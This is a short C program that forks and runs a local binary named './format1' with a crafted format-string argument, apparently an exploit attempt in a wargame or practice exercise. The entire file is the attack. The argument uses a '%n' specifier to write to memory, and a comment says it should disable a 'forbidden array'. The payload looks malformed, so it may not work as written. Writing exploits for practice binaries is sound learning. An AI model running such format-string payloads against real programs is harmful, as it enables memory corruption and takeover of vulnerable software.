#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>


int main(int argc, char * argv[])
{
    pid_t pid = fork();
    if (pid == 0)
    {

        // this is the child process

        //this should be able to disable the forbidden array when printed 
        char * argv[] = { "./format1","0x60%$nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", NULL};

        execv(argv[0], argv);
    }
    // else if (pid == -1) fork failed, throw an error!

    int status;
    wait(&status);

    return 0;
}